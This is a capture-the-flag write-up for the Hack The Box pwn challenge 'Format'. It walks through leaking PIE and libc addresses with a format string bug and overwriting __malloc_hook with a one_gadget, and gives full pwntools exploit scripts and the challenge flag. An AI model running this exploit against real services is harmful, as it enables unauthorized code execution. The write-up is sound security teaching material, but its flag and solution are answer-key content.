# Format
> Write-up author: jon-brandy
## DESCRIPTION:
Can you hear the echo?
## HINT:
- NONE
## STEPS:
1. In this challenge we're given a 64 bit binary, dynamically linked, and not stripped.

```console
┌──(brandy㉿bread-yolk)-[~/Downloads/format_htb]
└─$ file format
format: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5d38e04d29b4aae722164869f3151cea776ce91c, for GNU/Linux 3.2.0, not stripped
```

> BINARY PROTECTIONS

```console
┌──(brandy㉿bread-yolk)-[~/Downloads/format_htb]
└─$ pwn checksec format                                     
[*] '/home/brandy/Downloads/format_htb/format'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

2. After decompiled the binary, it seems we can leak - calculate the piebase and libc base using the format strings vuln.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8e3f2da2-36ef-481e-b471-b432a1dafa77)


3. But there is no BOF, hence we can't do ret2libc here. Also, we can't overwrite the Global Offset Table because RELRO is full.
4. So how to get RCE? We still can utilize `__malloc_hook`.

#### MALLOC HOOK

- **__malloc_hook** is a hook function which is called whenever malloc is called.
- We can use one_gadget and we can trigger them by sending big buffer.
- printf() will use malloc to allocate memory after we sent big buffer.


5. Let's grab the piebase and potential libc.

> Actually there is many potential libc address, but i grabbed the 1st one.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/fd8097b8-44e8-4e63-8058-8765319f4a73)


> Many potential pie we can use to calculate the base.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f41313c3-13fb-4455-8ceb-aa392f095f1f)


#### NOTES: In this writeup i won't explain again how to calculate the libc base and piebase again, i've explained this many times, go check my other writeups for explaination.


6. After calculating the piebase and libc base, before overwriting **__malloc_hook** with **one_gadget**, we need to identify the libc used at the remote server so we won't work twice.
7. Well, what I did to identify the remote server is kind of lucky, I guess; maybe there are many ways that are more straightforward.

---

### FLOW

- Do breakrva at the printf() and run the script using GDB args.


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b52c71f9-3ab8-4bfc-95f4-5c5273816744)


> SCRIPT Pt.1

```py
from pwn import *
import os
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

## 0x11f1
gdbscript = '''
init-pwndbg
breakrva 0x11f1
continue
'''.format(**locals())

exe = './format'
elf = context.binary = ELF(exe, checksec=True)
# context.log_level = 'DEBUG'
# context.log_level = 'ERROR'
context.log_level = 'INFO'

library = '/lib/x86_64-linux-gnu/libc.so.6'
libc = context.binary = ELF(library, checksec=False)

# # LEAKING POTENTIAL LIBC BASE
sh = start()
for i in range(200):
    sh.sendline('%{}$p'.format(i))
    get = sh.recvline().strip()
    print(str(i), ':', get)
```

> We got _IO_2_1_stdin_

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/23018b14-617e-4abf-aaf3-e6df41379ce2)


- But when i used the leaked **_IO_2_1_stdin_** at the remote server and check it on blukat, it did not found any libc relevant to this.
- Anyway, at the end i got result after sending the **_IO_2_1_stderr_**.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/81201f90-1a27-49a4-9ac5-3f6b98aef802)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0491790b-3959-4d42-ab67-f322936d1350)


- But, we need to know the actual libc used, to minimize the probability i used the leaked **_IO_file_jumps**.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/d4ddadd0-092b-405c-8ce1-b5ce1ad6e076)


> AT REMOTE

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/2562483f-d25e-4ca6-8bab-b40ef62fdfe1)


> RESULT at libc blukat

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/3c959958-8de6-425f-b075-a746bc94cfd5)


- It's better than before, but we need to find the correct one. Notice, we can ignore the first seven (because they are for 32 bit).
- Our interest are these:

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f46a959e-d70d-4908-9a58-2c2b709aa02a)


- So this is where my way gets unintended, I didn't leak the printf@got or fgets@got to get more accurate libc result, I immediately tried the `libc6_2.27-3ubuntu1_amd64 `. So what comes to my mind, if the `libc6_2.27-3ubuntu1_amd64` does not work, i will use the `libc6_2.27-3ubuntu1.2_amd64 ` and so on.

> FYI --> snippet for get fmtstr offset.

```py
sh = process(exe)
def exploit(payload):
    sh.sendline(payload)
    return sh.recvline().strip()

format_strings = FmtStr(execute_fmt=exploit)
log.success('OFFSET --> %d', format_strings.offset)
```

---

8. Download the libc and do pwninit.


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/4c04a585-0e6e-4fba-8b11-e5b94ae73d89)


9. Great, let's grab one_gadget and __malloc_hook.

> ONE_GADGET --> try the 2nd one (0x4f322).

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/dd519df9-6320-47bd-b6e2-1d2b956849b6)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/3daf400f-abd1-4894-adb4-3c73aeee7a87)


10. Our script so far.

> SCRIPT (95%).

```py
from pwn import *
import os
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

## 0x11f1
gdbscript = '''
init-pwndbg
breakrva 0x11f1
continue
'''.format(**locals())

exe = './format_patched'
elf = context.binary = ELF(exe, checksec=True)
# context.log_level = 'DEBUG'
# context.log_level = 'ERROR'
context.log_level = 'INFO'

# library = '/lib/x86_64-linux-gnu/libc.so.6'
library = './libc6_2.27-3ubuntu1_amd64.so' # remote libc
libc = context.binary = ELF(library, checksec=False)

# # LEAKING POTENTIAL LIBC BASE
# sh = start()
# for i in range(200):
#     sh.sendline('%{}$p'.format(i))
#     get = sh.recvline().strip()
#     print(str(i), ':', get)

# GET FORMAT STRINGS OFFSET
sh = process(exe)
def exploit(payload):
    sh.sendline(payload)
    return sh.recvline().strip()

format_strings = FmtStr(execute_fmt=exploit)
log.success('OFFSET --> %d', format_strings.offset)

sh = start()
#pause()
# # sh.sendline('%37$p.%1$p')
# sh.sendline('%37$p.%28$p') # 28 _IO_file_jumps
sh.sendline('%37$p.%2$p')
get = sh.recvline().strip()
leaked_pie = int(get[:14], 16)
log.success('LEAKED PIE --> %#0x', leaked_pie)
elf.address = leaked_pie - 0x126d # 4717
log.success('PIE BASE --> %#0x', elf.address)

leaked_libc = int(get[15:], 16)
log.success('LEAKED LIBC --> %#0x', leaked_libc)
libc.address = leaked_libc - 0x3ed8d0 # 4118736
log.success('LIBC BASE --> %#0x', libc.address)

malloc_hook = libc.address + 0x98700
log.success('MALLOC HOOK --> %#0x', malloc_hook)

one_gadget = libc.address + 0x4f322
malloc = libc.address + 0x3ebc30

sh.interactive()
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e315f8f9-2f53-4d1e-be87-5699aa7006db)



11. For the final script, we just need to overwrite __malloc_hook to one_gadget using fmtstr_payload, then send big buffer.

> FINAL SCRIPT

```py
from pwn import *
import os
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

## 0x11f1
gdbscript = '''
init-pwndbg
breakrva 0x11f1
continue
'''.format(**locals())

exe = './format_patched'
elf = context.binary = ELF(exe, checksec=True)
# context.log_level = 'DEBUG'
# context.log_level = 'ERROR'
context.log_level = 'INFO'

# library = '/lib/x86_64-linux-gnu/libc.so.6'
library = './libc6_2.27-3ubuntu1_amd64.so' # remote libc
libc = context.binary = ELF(library, checksec=False)

# # LEAKING POTENTIAL LIBC BASE
# sh = start()
# for i in range(200):
#     sh.sendline('%{}$p'.format(i))
#     get = sh.recvline().strip()
#     print(str(i), ':', get)

# GET FORMAT STRINGS OFFSET
sh = process(exe)
def exploit(payload):
    sh.sendline(payload)
    return sh.recvline().strip()

format_strings = FmtStr(execute_fmt=exploit)
log.success('OFFSET --> %d', format_strings.offset)

sh = start()
#pause()
# # sh.sendline('%37$p.%1$p')
# sh.sendline('%37$p.%28$p') # 28 _IO_file_jumps
sh.sendline('%37$p.%2$p')
get = sh.recvline().strip()
leaked_pie = int(get[:14], 16)
log.success('LEAKED PIE --> %#0x', leaked_pie)
elf.address = leaked_pie - 0x126d # 4717
log.success('PIE BASE --> %#0x', elf.address)

leaked_libc = int(get[15:], 16)
log.success('LEAKED LIBC --> %#0x', leaked_libc)
libc.address = leaked_libc - 0x3ed8d0 # 4118736
log.success('LIBC BASE --> %#0x', libc.address)

malloc_hook = libc.address + 0x98700
log.success('MALLOC HOOK --> %#0x', malloc_hook)

one_gadget = libc.address + 0x4f322
malloc = libc.address + 0x3ebc30

payload = fmtstr_payload(format_strings.offset, {malloc:one_gadget})
sh.sendline(payload)
sh.sendline(b'%100000s') # GOT RCE AT 100000s. | or you can just send %1000000c --> Since we're sending big buffer, it shall trigger malloc usage.

sh.interactive()
```

> TEST LOCAL

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e9e40da5-f2b8-4303-8a18-88d812c7245b)


> TEST REMOTELY

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f4bbce2a-8971-443d-ae41-a7201d6521aa)


## FLAG

```
HTB{mall0c_h00k_f0r_th3_w1n!}
```

